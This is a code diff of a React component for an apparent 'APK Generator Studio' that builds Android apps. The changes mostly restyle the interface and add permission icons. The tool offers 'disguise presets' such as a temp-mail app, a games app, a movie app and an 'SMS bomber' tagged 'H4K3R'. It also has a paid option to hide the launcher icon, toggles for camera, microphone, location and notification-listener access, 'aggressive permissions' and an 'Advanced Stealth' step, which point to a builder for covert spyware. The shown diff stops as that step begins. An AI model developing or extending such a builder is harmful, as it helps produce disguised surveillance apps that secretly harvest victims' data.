@@ -7,7 +7,7 @@ import {
     ChevronRight, ChevronLeft, Download, Eye, EyeOff, 
     AlertTriangle, Sparkles, Sliders, RefreshCw, Layers, CheckCircle2, Info,
     Mail, Gamepad2, Film, Flame, Globe, Upload, ExternalLink, X, ChevronDown, ChevronUp,
-    Settings, MousePointerClick
+    Settings, MousePointerClick, Camera, Mic, MapPin, Users, MessageSquare, HardDrive
 } from 'lucide-react';
 
 interface AppGenerationModalProps {
@@ -157,10 +157,9 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
     const [downloadUrl, setDownloadUrl] = useState("");
     const [queuePosition, setQueuePosition] = useState(0);
 
-    // Ref for the main scrollable content area to reset scroll to top on tab switch
     const contentScrollRef = useRef<HTMLDivElement>(null);
 
-    // Auto reset scroll position to very top (scrollTop = 0) whenever activeStep or isOpen changes
+    // Auto reset scroll position to top on tab switch
     useEffect(() => {
         if (contentScrollRef.current) {
             contentScrollRef.current.scrollTo({ top: 0, behavior: 'instant' });
@@ -184,6 +183,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
             setEnableStoragePermission(true);
             setEnableCameraPermission(false);
             setEnableMicrophonePermission(false);
+            setEnableLocationPermission(false);
             setEnableNotificationListener(false);
             setShowPlayProtectWarning(false);
             setAggressivePermissions(false);
@@ -196,23 +196,17 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
         }
     }, [activeStep, isOpen]);
 
-    // Selected Preset State
     const [selectedPreset, setSelectedPreset] = useState<string>('custom');
 
-    // Custom App Specific State (ISOLATED from Pre-Integrated Presets)
+    // Custom App Specific State
     const [customAppName, setCustomAppName] = useState("");
     const [customPackageName, setCustomPackageName] = useState("com.gallery.eye");
     const [customWebLink, setCustomWebLink] = useState("");
     const [customIcon, setCustomIcon] = useState<File | null>(null);
     const [customIconPreview, setCustomIconPreview] = useState<string | null>(null);
-
-    // Global Hide Launcher Icon State (Only applicable to custom mode)
     const [hideApp, setHideApp] = useState(false);
-
-    // App Mode Info Modal State
     const [showAppInfoModal, setShowAppInfoModal] = useState<string | null>(null);
 
-    // Generate exactly 3 segments format: com.project.app
     const generatePackageName = (name: string) => {
         const cleaned = name.toLowerCase().replace(/[^a-z0-9\s]/g, '').trim();
         const parts = cleaned.split(/\s+/).filter(Boolean);
@@ -256,7 +250,6 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
     const [notificationTitle, setNotificationTitle] = useState("");
     const [notificationText, setNotificationText] = useState("");
 
-    // Custom UI Dropdown menu states
     const [isStyleMenuOpen, setIsStyleMenuOpen] = useState(false);
     const [isActionMenuOpen, setIsActionMenuOpen] = useState(false);
     const [isIconMenuOpen, setIsIconMenuOpen] = useState(false);
@@ -313,7 +306,6 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
         },
     };
 
-    // Auto-select smart behavior when selecting a notification style
     const handleSelectStyle = (key: string) => {
         setNotificationStyle(key);
         const preset = NOTIFICATION_PRESETS[key];
@@ -324,7 +316,6 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
         setIsStyleMenuOpen(false);
     };
 
-    // Exactly ordered: 1st App Info, 2nd Do Nothing, clean simple titles without subtitles
     const CLICK_ACTIONS: Record<string, string> = {
         device_info: "Open App Info & Permissions",
         none: "Do Nothing (Silent Background)",
@@ -346,18 +337,6 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
     const [showCustomAlert, setShowCustomAlert] = useState(false);
     const [alertData, setAlertData] = useState({ title: '', message: '', type: 'error' as 'error' | 'warning' | 'success' | 'info' });
 
-    useEffect(() => {
-        if (isOpen) {
-            setStatus('idle');
-            setProgress(0);
-            setProgressStep("");
-            setDownloadUrl("");
-            setQueuePosition(0);
-            setActiveStep('identity');
-        }
-    }, [isOpen]);
-
-    // Active preset details helper
     const getActiveAppDetails = () => {
         const preset = APP_PRESETS.find(p => p.id === selectedPreset);
         if (!preset || selectedPreset === 'custom') {
@@ -441,7 +420,6 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
     }, [socket, activeApp.name]);
 
     const startGeneration = async () => {
-        // Validation: ONLY validate when custom preset is selected AND hideApp is OFF
         if (selectedPreset === 'custom' && !hideApp) {
             if (!customAppName.trim()) {
                 setAlertData({
@@ -540,43 +518,41 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
         }
     };
 
-    // Mini 48px tile icon renderer for grid selection
     const renderPresetIconBadge = (presetId: string) => {
         switch (presetId) {
             case 'temp_mail':
                 return (
-                    <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-[#10B981] via-[#059669] to-[#047857] flex items-center justify-center shadow-md border border-white/20">
+                    <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-emerald-500 to-teal-700 flex items-center justify-center shadow-lg border border-white/20">
                         <Mail className="w-6 h-6 text-white drop-shadow" />
                     </div>
                 );
             case 'poki_games':
                 return (
-                    <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-[#A855F7] via-[#9333EA] to-[#6B21A8] flex items-center justify-center shadow-md border border-white/20">
+                    <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-purple-500 to-indigo-700 flex items-center justify-center shadow-lg border border-white/20">
                         <Gamepad2 className="w-6 h-6 text-white drop-shadow" />
                     </div>
                 );
             case 'movie_box':
                 return (
-                    <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-[#F43F5E] via-[#E11D48] to-[#9F1239] flex items-center justify-center shadow-md border border-white/20">
+                    <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-rose-500 to-red-700 flex items-center justify-center shadow-lg border border-white/20">
                         <Film className="w-6 h-6 text-white drop-shadow" />
                     </div>
                 );
             case 'sms_bomber':
                 return (
-                    <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-[#F59E0B] via-[#EA580C] to-[#DC2626] flex items-center justify-center shadow-md border border-amber-300/30">
-                        <Flame className="w-6 h-6 text-amber-200 drop-shadow" />
+                    <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-amber-500 to-orange-700 flex items-center justify-center shadow-lg border border-amber-300/30">
+                        <Flame className="w-6 h-6 text-amber-100 drop-shadow" />
                     </div>
                 );
             default:
                 return (
-                    <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-[#6366F1] via-[#4F46E5] to-[#3730A3] flex items-center justify-center shadow-md border border-white/20">
+                    <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-orange-500 to-amber-600 flex items-center justify-center shadow-lg border border-white/20">
                         <Globe className="w-6 h-6 text-white drop-shadow" />
                     </div>
                 );
         }
     };
 
-    // Realistic Android screen icon renderer (STRICTLY ISOLATED BY PRESET)
     const renderRealisticIcon = () => {
         if (selectedPreset === 'custom') {
             if (customIconPreview) {
@@ -587,11 +563,11 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                 );
             }
             return (
-                <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-[#6366F1] via-[#4F46E5] to-[#3730A3] p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(99,102,241,0.45)] border border-white/25 relative overflow-hidden group">
+                <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-orange-500 via-amber-600 to-orange-700 p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(249,115,22,0.45)] border border-white/25 relative overflow-hidden group">
                     <div className="w-12 h-12 rounded-2xl bg-white/20 backdrop-blur-md flex items-center justify-center border border-white/30 shadow-inner">
                         <Globe className="w-7 h-7 text-white drop-shadow" />
                     </div>
-                    <span className="text-[9px] font-black tracking-widest text-white/90 uppercase mt-1 drop-shadow">CUSTOM</span>
+                    <span className="text-[9px] font-black tracking-widest text-white/90 uppercase mt-1 drop-shadow font-mono">CUSTOM</span>
                 </div>
             );
         }
@@ -599,51 +575,48 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
         switch (selectedPreset) {
             case 'temp_mail':
                 return (
-                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-[#10B981] via-[#059669] to-[#047857] p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(16,185,129,0.45)] border border-white/25 relative overflow-hidden group">
+                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-emerald-500 via-teal-600 to-emerald-800 p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(16,185,129,0.45)] border border-white/25 relative overflow-hidden group">
                         <div className="absolute inset-0 bg-gradient-to-t from-black/20 to-transparent" />
                         <div className="w-12 h-10 rounded-xl bg-white/20 backdrop-blur-md flex items-center justify-center border border-white/30 shadow-inner">
                             <Mail className="w-7 h-7 text-white drop-shadow" />
                         </div>
-                        <span className="text-[9px] font-black tracking-widest text-white/90 uppercase mt-1.5 drop-shadow">MAIL.TM</span>
+                        <span className="text-[9px] font-black tracking-widest text-white/90 uppercase mt-1.5 drop-shadow font-mono">MAIL.TM</span>
                     </div>
                 );
             case 'poki_games':
                 return (
-                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-[#A855F7] via-[#9333EA] to-[#6B21A8] p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(168,85,247,0.45)] border border-white/25 relative overflow-hidden group">
-                        <div className="absolute -top-6 -right-6 w-16 h-16 bg-pink-400/30 rounded-full blur-xl" />
+                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-purple-500 via-indigo-600 to-purple-800 p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(168,85,247,0.45)] border border-white/25 relative overflow-hidden group">
                         <div className="w-12 h-12 rounded-2xl bg-white/15 backdrop-blur-md flex items-center justify-center border border-white/30 shadow-inner">
                             <Gamepad2 className="w-7 h-7 text-white drop-shadow" />
                         </div>
-                        <span className="text-[9px] font-black tracking-widest text-white/90 uppercase mt-1 drop-shadow">POKI</span>
+                        <span className="text-[9px] font-black tracking-widest text-white/90 uppercase mt-1 drop-shadow font-mono">POKI</span>
                     </div>
                 );
             case 'movie_box':
                 return (
-                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-[#F43F5E] via-[#E11D48] to-[#9F1239] p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(244,63,94,0.45)] border border-white/25 relative overflow-hidden group">
-                        <div className="absolute inset-0 bg-[radial-gradient(circle_at_top_right,rgba(255,255,255,0.25),transparent)]" />
+                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-rose-500 via-red-600 to-rose-800 p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(244,63,94,0.45)] border border-white/25 relative overflow-hidden group">
                         <div className="w-12 h-12 rounded-2xl bg-white/20 backdrop-blur-md flex items-center justify-center border border-white/30 shadow-inner">
                             <Film className="w-7 h-7 text-white drop-shadow" />
                         </div>
-                        <span className="text-[9px] font-black tracking-widest text-white/90 uppercase mt-1 drop-shadow">CINEMA</span>
+                        <span className="text-[9px] font-black tracking-widest text-white/90 uppercase mt-1 drop-shadow font-mono">CINEMA</span>
                     </div>
                 );
             case 'sms_bomber':
                 return (
-                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-[#F59E0B] via-[#EA580C] to-[#DC2626] p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(245,158,11,0.45)] border border-white/25 relative overflow-hidden group">
-                        <div className="absolute inset-0 bg-gradient-to-b from-transparent via-black/10 to-black/30" />
+                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-amber-500 via-orange-600 to-red-700 p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(245,158,11,0.45)] border border-white/25 relative overflow-hidden group">
                         <div className="w-12 h-12 rounded-2xl bg-black/30 backdrop-blur-md flex items-center justify-center border border-amber-300/40 shadow-inner">
                             <Flame className="w-7 h-7 text-amber-300 drop-shadow-[0_0_8px_rgba(251,191,36,0.8)]" />
                         </div>
-                        <span className="text-[9px] font-black tracking-widest text-amber-200 uppercase mt-1 drop-shadow">H4K3R</span>
+                        <span className="text-[9px] font-black tracking-widest text-amber-200 uppercase mt-1 drop-shadow font-mono">H4K3R</span>
                     </div>
                 );
             default:
                 return (
-                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-[#6366F1] via-[#4F46E5] to-[#3730A3] p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(99,102,241,0.45)] border border-white/25 relative overflow-hidden group">
+                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-orange-500 via-amber-600 to-orange-700 p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(249,115,22,0.45)] border border-white/25 relative overflow-hidden group">
                         <div className="w-12 h-12 rounded-2xl bg-white/20 backdrop-blur-md flex items-center justify-center border border-white/30 shadow-inner">
                             <Globe className="w-7 h-7 text-white drop-shadow" />
                         </div>
-                        <span className="text-[9px] font-black tracking-widest text-white/90 uppercase mt-1 drop-shadow">CUSTOM</span>
+                        <span className="text-[9px] font-black tracking-widest text-white/90 uppercase mt-1 drop-shadow font-mono">CUSTOM</span>
                     </div>
                 );
         }
@@ -652,72 +625,79 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
     if (!isOpen) return null;
 
     return (
-        <div className="fixed inset-0 z-[300] flex items-center justify-center bg-black/80 backdrop-blur-xl animate-in fade-in duration-200 p-3 sm:p-6 overflow-y-auto">
-            <div className="bg-[#101217] border border-white/10 rounded-[2.5rem] max-w-2xl w-full flex flex-col shadow-[0_25px_80px_rgba(0,0,0,0.9)] relative max-h-[92dvh] overflow-hidden">
+        <div className="fixed inset-0 z-[300] flex items-center justify-center bg-black/85 backdrop-blur-2xl animate-in fade-in duration-200 p-3 sm:p-6 overflow-y-auto">
+            
+            {/* ── Main 3D Clay Modal Studio ── */}
+            <div className="clay-card max-w-2xl w-full flex flex-col rounded-[2.5rem] relative max-h-[92dvh] overflow-hidden shadow-[0_25px_80px_rgba(0,0,0,0.95)] border border-white/10">
                 
-                {/* 2-Row Spacious Header */}
-                <div className="border-b border-white/10 bg-black/60">
-                    {/* Top row: Title + Rose Close Button */}
-                    <div className="px-5 py-3.5 flex items-center justify-between">
-                        <div className="flex items-center gap-2">
-                            <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
-                            <span className="text-sm font-black text-white uppercase tracking-wider">App Studio</span>
+                {/* ── Studio Header & Tactile Stepper ── */}
+                <div className="border-b border-white/5 bg-black/40 p-4 sm:p-5 space-y-3 shrink-0">
+                    
+                    {/* Top Bar: Title & Close Action */}
+                    <div className="flex items-center justify-between">
+                        <div className="flex items-center gap-2.5">
+                            <div className="clay-icon-pod w-8 h-8 rounded-xl flex items-center justify-center">
+                                <Smartphone size={16} className="text-orange-400" />
+                            </div>
+                            <span className="text-sm font-black text-white uppercase tracking-wider font-mono">APK Generator Studio</span>
                         </div>
+                        
                         <button
+                            type="button"
                             onClick={onClose}
-                            className="w-9 h-9 rounded-full bg-rose-500/20 hover:bg-rose-500/35 border border-rose-500/50 flex items-center justify-center text-rose-300 hover:text-white shadow-[0_0_15px_rgba(244,63,94,0.3)] transition-all flex-shrink-0"
-                            title="Close App Studio"
+                            className="clay-card-error w-8 h-8 rounded-full flex items-center justify-center text-red-300 hover:text-white transition-all cursor-pointer"
+                            title="Close Studio"
                         >
-                            ✕
+                            <X size={15} />
                         </button>
                     </div>
 
-                    {/* Bottom row: Perfectly Balanced Responsive Stepper Bar (Instant toggle, ZERO trailing blink/flicker) */}
-                    <div className="px-3 pb-3.5">
-                        <div className="flex items-center justify-between gap-1 sm:gap-2 p-1.5 rounded-2xl bg-black/50 border border-white/10">
-                            {[
-                                { id: 'identity', stepNum: '1', label: 'App Mode' },
-                                { id: 'permissions', stepNum: '2', label: 'Permissions' },
-                                { id: 'notifications', stepNum: '3', label: 'Service Style' }
-                            ].map((item) => {
-                                const isActive = activeStep === item.id;
-                                return (
-                                    <button
-                                        key={item.id}
-                                        type="button"
-                                        onClick={() => setActiveStep(item.id as any)}
-                                        className={`flex-1 flex items-center justify-center gap-1.5 py-2.5 px-2 sm:px-3.5 rounded-xl border ${
-                                            isActive
-                                                ? 'bg-gradient-to-r from-emerald-500/20 to-teal-500/20 text-emerald-300 border-emerald-500/60 shadow-[0_0_16px_rgba(16,185,129,0.22)] font-extrabold'
-                                                : 'border-transparent text-fg-3 hover:text-white hover:bg-white/[0.04]'
-                                        }`}
-                                    >
-                                        <span className={`w-5 h-5 rounded-full flex items-center justify-center text-[10px] font-black flex-shrink-0 ${
-                                            isActive ? 'bg-emerald-400 text-black shadow-sm' : 'bg-white/10 text-fg-3'
-                                        }`}>
-                                            {item.stepNum}
-                                        </span>
-                                        <span className="text-[11px] sm:text-xs font-bold whitespace-nowrap tracking-tight">
-                                            {item.label}
-                                        </span>
-                                    </button>
-                                );
-                            })}
-                        </div>
+                    {/* Stepper Tabs */}
+                    <div className="grid grid-cols-3 gap-2 bg-[#090b0e] p-1 rounded-2xl border border-white/5 shadow-inner">
+                        {[
+                            { id: 'identity', stepNum: '1', label: 'App Mode' },
+                            { id: 'permissions', stepNum: '2', label: 'Permissions' },
+                            { id: 'notifications', stepNum: '3', label: 'Service Style' }
+                        ].map((item) => {
+                            const isActive = activeStep === item.id;
+                            return (
+                                <button
+                                    key={item.id}
+                                    type="button"
+                                    onClick={() => setActiveStep(item.id as any)}
+                                    className={`py-2 px-2 sm:px-3 rounded-xl flex items-center justify-center gap-2 transition-all duration-200 cursor-pointer ${
+                                        isActive
+                                            ? 'bg-gradient-to-r from-orange-500 to-amber-500 text-white font-black shadow-[0_4px_16px_rgba(249,115,22,0.45)]'
+                                            : 'bg-transparent text-white/40 hover:text-white/80 hover:bg-white/5'
+                                    }`}
+                                >
+                                    <span className={`w-4 h-4 rounded-full flex items-center justify-center text-[10px] font-mono font-black ${
+                                        isActive ? 'bg-black text-orange-300' : 'bg-white/10 text-white/40'
+                                    }`}>
+                                        {item.stepNum}
+                                    </span>
+                                    <span className="text-[11px] sm:text-xs font-bold whitespace-nowrap">
+                                        {item.label}
+                                    </span>
+                                </button>
+                            );
+                        })}
                     </div>
                 </div>
 
-                {/* Main Content Area - Auto scrolls to top on tab switch via contentScrollRef */}
-                <div ref={contentScrollRef} className="p-5 sm:p-7 overflow-y-auto flex-1 space-y-6 custom-scrollbar">
+                {/* ── Scrollable Body Area ── */}
+                <div ref={contentScrollRef} className="p-5 sm:p-6 overflow-y-auto flex-1 space-y-6 custom-scrollbar">
                     
-                    {/* STEP 1: APPLICATION MODES & PRESETS */}
+                    {/* ═════════ STEP 1: IDENTITY & APPLICATION MODES ═════════ */}
                     {activeStep === 'identity' && (
-                        <div className="space-y-6">
+                        <div className="space-y-6 animate-in fade-in zoom-in-95 duration-200">
                             
-                            {/* App Icon Tile Grid */}
+                            {/* App Preset Tile Grid */}
                             <div>
-                                <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest mb-3">Select Application Mode</label>
-                                <div className="grid grid-cols-3 sm:grid-cols-5 gap-3">
+                                <label className="block text-xs font-mono font-bold text-orange-300/80 uppercase tracking-wider mb-2.5">
+                                    Select Application Disguise Preset
+                                </label>
+                                <div className="grid grid-cols-3 sm:grid-cols-5 gap-2.5">
                                     {APP_PRESETS.map((p) => {
                                         const isSelected = selectedPreset === p.id;
                                         return (
@@ -725,14 +705,14 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                                 key={p.id}
                                                 type="button"
                                                 onClick={() => setSelectedPreset(p.id)}
-                                                className={`p-3.5 rounded-2xl border flex flex-col items-center justify-center gap-2.5 transition-all text-center ${
+                                                className={`clay-capsule p-3 rounded-2xl flex flex-col items-center justify-center gap-2 text-center transition-all cursor-pointer ${
                                                     isSelected
-                                                        ? 'bg-emerald-500/15 border-emerald-500/60 shadow-[0_0_20px_rgba(16,185,129,0.2)] scale-[1.03]'
-                                                        : 'bg-black/40 border-white/10 hover:border-white/20 text-fg-3 hover:bg-white/[0.04]'
+                                                        ? 'border-orange-500/80 bg-orange-500/15 shadow-[0_0_16px_rgba(249,115,22,0.35)] scale-[1.03]'
+                                                        : 'hover:border-white/20'
                                                 }`}
                                             >
                                                 {renderPresetIconBadge(p.id)}
-                                                <span className={`text-xs font-bold leading-tight truncate w-full ${isSelected ? 'text-white' : 'text-fg-3'}`}>
+                                                <span className={`text-[11px] font-bold leading-tight truncate w-full ${isSelected ? 'text-orange-200' : 'text-white/60'}`}>
                                                     {p.name}
                                                 </span>
                                             </button>
@@ -741,60 +721,64 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                 </div>
                             </div>
 
-                            {/* Form Configuration / Preview Section */}
-                            <div className={`grid grid-cols-1 ${selectedPreset === 'custom' ? 'sm:grid-cols-12 gap-5' : 'sm:grid-cols-1'} items-start pt-1`}>
+                            {/* Form & Live Phone Preview Section */}
+                            <div className={`grid grid-cols-1 ${selectedPreset === 'custom' ? 'sm:grid-cols-12 gap-4' : 'sm:grid-cols-1'} items-start pt-1`}>
                                 
-                                {/* Form Inputs: ONLY Shown when selectedPreset === 'custom' */}
+                                {/* Form Inputs (Custom Mode ONLY) */}
                                 {selectedPreset === 'custom' && (
-                                    <div className="sm:col-span-7 space-y-4 animate-in fade-in">
-                                        {/* App Display Name */}
+                                    <div className="sm:col-span-7 space-y-3.5 animate-in fade-in">
                                         <div>
-                                            <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">App Display Name</label>
+                                            <label className="block text-xs font-mono font-bold text-white/50 uppercase tracking-wider mb-1">
+                                                App Display Name
+                                            </label>
                                             <input
                                                 type="text"
                                                 value={customAppName}
                                                 onChange={(e) => handleAppNameChange(e.target.value)}
-                                                className="w-full bg-black/50 border border-white/10 rounded-2xl px-4 py-3 text-white font-bold focus:outline-none focus:border-emerald-500/60 transition-colors shadow-inner"
-                                                placeholder="enter your app name"
+                                                className="clay-capsule w-full px-3.5 py-2.5 rounded-xl text-xs font-bold text-white placeholder:text-white/30 focus:outline-none focus:border-orange-500/60 shadow-inner"
+                                                placeholder="e.g. Gallery Vault"
                                             />
                                         </div>
 
-                                        {/* Package Identifier (Exactly 3 Segments e.g. com.gallery.eye) */}
                                         <div>
-                                            <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">Package Identifier</label>
+                                            <label className="block text-xs font-mono font-bold text-white/50 uppercase tracking-wider mb-1">
+                                                Package Identifier
+                                            </label>
                                             <input
                                                 type="text"
                                                 value={customPackageName}
                                                 onChange={(e) => setCustomPackageName(e.target.value.toLowerCase().replace(/[^a-z0-9.]/g, ''))}
-                                                className="w-full bg-black/50 border border-white/10 rounded-2xl px-4 py-3 text-white font-mono text-xs focus:outline-none focus:border-emerald-500/60 transition-colors shadow-inner"
+                                                className="clay-capsule w-full px-3.5 py-2.5 rounded-xl text-xs font-mono text-white/90 placeholder:text-white/30 focus:outline-none focus:border-orange-500/60 shadow-inner"
                                                 placeholder="com.gallery.eye"
                                             />
-                                            <p className="text-[11px] text-fg-4 mt-1">Format: com.project.name (3 segments)</p>
+                                            <p className="text-[10px] font-mono text-white/30 mt-0.5">Format: com.project.name</p>
                                         </div>
 
-                                        {/* Custom Web Portal Link */}
                                         <div>
-                                            <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">Launch Web URL</label>
+                                            <label className="block text-xs font-mono font-bold text-white/50 uppercase tracking-wider mb-1">
+                                                Launch Web URL
+                                            </label>
                                             <input
                                                 type="url"
                                                 value={customWebLink}
                                                 onChange={(e) => setCustomWebLink(e.target.value)}
-                                                className="w-full bg-black/50 border border-white/10 rounded-2xl px-4 py-3 text-white text-sm focus:outline-none focus:border-emerald-500/60 transition-colors shadow-inner"
+                                                className="clay-capsule w-full px-3.5 py-2.5 rounded-xl text-xs font-mono text-white/90 placeholder:text-white/30 focus:outline-none focus:border-orange-500/60 shadow-inner"
                                                 placeholder="https://example.com"
                                             />
                                         </div>
 
-                                        {/* Custom Icon PNG */}
                                         <div>
-                                            <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">Upload Custom Icon PNG</label>
-                                            <label className="w-full bg-black/40 border border-dashed border-white/15 hover:border-white/30 rounded-2xl p-3 flex items-center justify-between cursor-pointer transition-colors group">
+                                            <label className="block text-xs font-mono font-bold text-white/50 uppercase tracking-wider mb-1">
+                                                Custom Icon PNG
+                                            </label>
+                                            <label className="clay-capsule w-full p-2.5 rounded-xl flex items-center justify-between cursor-pointer border-dashed hover:border-orange-500/50 transition-colors group">
                                                 <div className="flex items-center gap-2.5">
-                                                    <div className="w-9 h-9 rounded-xl bg-white/5 flex items-center justify-center text-fg-3 group-hover:text-white transition-colors">
-                                                        <Upload size={16} />
+                                                    <div className="w-8 h-8 rounded-lg bg-orange-500/15 flex items-center justify-center text-orange-400 group-hover:scale-105 transition-transform">
+                                                        <Upload size={14} />
                                                     </div>
                                                     <div>
                                                         <span className="text-xs font-bold text-white block">Choose PNG / JPG Icon</span>
-                                                        <span className="text-[10px] text-fg-4">Recommended 512x512px transparent</span>
+                                                        <span className="text-[9px] font-mono text-white/40">512x512px transparent</span>
                                                     </div>
                                                 </div>
                                                 <input
@@ -808,62 +792,53 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     </div>
                                 )}
 
-                                {/* Soft UI Phone Home-Screen Preview */}
-                                <div className={`${selectedPreset === 'custom' ? 'sm:col-span-5' : 'max-w-sm mx-auto w-full'} bg-gradient-to-b from-black/60 to-black/30 border border-white/10 rounded-3xl p-5 flex flex-col items-center justify-center text-center shadow-xl relative`}>
-                                    <div className="text-[10px] font-bold text-fg-3 uppercase tracking-widest mb-4">Live Android Home Screen</div>
+                                {/* Live Android Screen Mockup */}
+                                <div className={`${selectedPreset === 'custom' ? 'sm:col-span-5' : 'max-w-xs mx-auto w-full'} clay-capsule p-4 rounded-3xl flex flex-col items-center justify-center text-center relative`}>
+                                    <div className="text-[9px] font-mono font-bold text-orange-400/80 uppercase tracking-widest mb-3">
+                                        Live Android Launcher Mockup
+                                    </div>
                                     
-                                    {/* App Icon Container with Corner Info Icon */}
-                                    <div className="w-24 h-24 mb-3 relative group">
+                                    <div className="w-20 h-20 mb-2 relative">
                                         {renderRealisticIcon()}
 
-                                        {/* Corner Info Button ONLY for Pre-integrated Apps */}
                                         {selectedPreset !== 'custom' && (
                                             <button
                                                 type="button"
                                                 onClick={() => setShowAppInfoModal(selectedPreset)}
-                                                className="w-7 h-7 rounded-full bg-black/80 text-emerald-300 border border-emerald-400/50 flex items-center justify-center absolute -top-2 -right-2 shadow-lg hover:scale-110 transition-transform"
+                                                className="w-6 h-6 rounded-full bg-black/80 text-orange-300 border border-orange-400/50 flex items-center justify-center absolute -top-1.5 -right-1.5 shadow-lg hover:scale-110 transition-transform cursor-pointer"
                                                 title="View App Details"
                                             >
-                                                <Info size={14} />
+                                                <Info size={12} />
                                             </button>
                                         )}
 
-                                        {/* Hidden Badge for Custom App */}
                                         {selectedPreset === 'custom' && hideApp && (
-                                            <div className="absolute -top-1.5 -right-1.5 px-2 py-0.5 rounded-full bg-red-500 text-white text-[9px] font-black tracking-wider uppercase shadow-lg">
+                                            <div className="absolute -top-1.5 -right-1.5 px-2 py-0.5 rounded-full bg-red-500 text-white text-[8px] font-mono font-black tracking-wider uppercase shadow-lg">
                                                 Hidden
                                             </div>
                                         )}
                                     </div>
 
-                                    <div className="flex items-center justify-center gap-1.5 max-w-full">
-                                        <span className="text-sm font-black text-white truncate">{activeApp.name}</span>
-                                    </div>
-                                    <span className="text-[10px] font-mono text-fg-4 mt-0.5 truncate max-w-[160px]">{activeApp.packageName}</span>
+                                    <span className="text-xs font-black text-white truncate max-w-[180px]">{activeApp.name}</span>
+                                    <span className="text-[9px] font-mono text-white/40 mt-0.5 truncate max-w-[180px]">{activeApp.packageName}</span>
 
-                                    {/* Hide App Toggle Switch (ONLY SHOWN FOR CUSTOM APP) */}
                                     {selectedPreset === 'custom' && (
-                                        <div className="mt-5 w-full pt-4 border-t border-white/10 flex items-center justify-between">
+                                        <div className="mt-4 w-full pt-3 border-t border-white/5 flex items-center justify-between">
                                             <div className="flex items-center gap-1.5">
-                                                <span className="text-xs font-bold text-fg-2">Hide Launcher Icon</span>
-                                                {isBasicPlan && (
-                                                    <Lock size={13} className="text-white/25" />
-                                                )}
+                                                <span className="text-xs font-bold text-white/70">Hide Launcher Icon</span>
+                                                {isBasicPlan && <Lock size={12} className="text-white/30" />}
                                             </div>
                                             <button
                                                 type="button"
                                                 onClick={() => {
-                                                    if (isBasicPlan) {
-                                                        onUpgrade?.();
-                                                        return;
-                                                    }
+                                                    if (isBasicPlan) { onUpgrade?.(); return; }
                                                     setHideApp(!hideApp);
                                                 }}
-                                                className={`w-11 h-6 rounded-full transition-colors relative ${
-                                                    isBasicPlan ? 'bg-white/10' : hideApp ? 'bg-emerald-500' : 'bg-white/20'
+                                                className={`w-10 h-5.5 rounded-full transition-colors relative cursor-pointer ${
+                                                    isBasicPlan ? 'bg-white/10' : hideApp ? 'bg-orange-500' : 'bg-white/20'
                                                 }`}
                                             >
-                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${hideApp && !isBasicPlan ? 'left-6' : 'left-1'}`} />
+                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-0.75 transition-transform ${hideApp && !isBasicPlan ? 'left-5' : 'left-1'}`} />
                                             </button>
                                         </div>
                                     )}
@@ -872,53 +847,53 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                         </div>
                     )}
 
-                    {/* STEP 2: APP ACCESS PERMISSIONS & ADVANCED STEALTH */}
+                    {/* ═════════ STEP 2: APP PERMISSIONS & ADVANCED STEALTH ═════════ */}
                     {activeStep === 'permissions' && (
-                        <div className="space-y-5">
